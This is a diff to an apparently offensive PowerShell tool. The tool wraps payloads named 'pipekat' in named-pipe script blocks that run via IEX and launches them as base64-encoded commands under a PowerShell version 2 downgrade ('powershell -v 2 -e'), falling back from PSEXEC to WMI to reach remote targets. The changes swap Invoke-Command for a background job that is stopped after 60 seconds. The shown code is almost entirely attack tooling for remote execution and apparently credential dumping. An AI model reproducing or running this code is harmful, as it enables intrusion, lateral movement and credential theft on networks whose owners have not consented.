@@ -140,8 +140,10 @@ function Encrypt-String
         `$pipe.Dispose();
 }
 add-Type -assembly "System.Core"
-Invoke-Command -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName,`$Payload)|Out-Null
+`$t = start-job -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName,`$Payload)
 `$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipeName);
+Start-Sleep 60
+`$t.StopJob()
 "@
 
 $mkun = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($mk))
@@ -247,12 +249,16 @@ $pipekat = @"
         `$pipe.Dispose();
 }
 add-Type -assembly "System.Core"
-Invoke-Command -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName)|Out-Null
+`$t = start-job -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName)
 `$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipeName);
+Start-Sleep 60
+`$t.StopJob()
+
 "@
 
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($pipekat)
 $payloadraw = 'cmd /c powershell -v 2 -e '+[Convert]::ToBase64String($bytes)
+#echo $payloadraw
 
 if ($PSexec) {
 echo "[-] There are unresolved running this remotely using PSEXEC, falling back to Invoke-WMI for remote targets"
@@ -388,8 +394,10 @@ $pipekat = @"
         IEX `$s |out-string
 }
 add-Type -assembly "System.Core"
-Invoke-Command -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName)|Out-Null
+`$t = start-job -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName)
 `$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipeName);
+Start-Sleep 60
+`$t.StopJob()
 "@
 
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($pipekat)
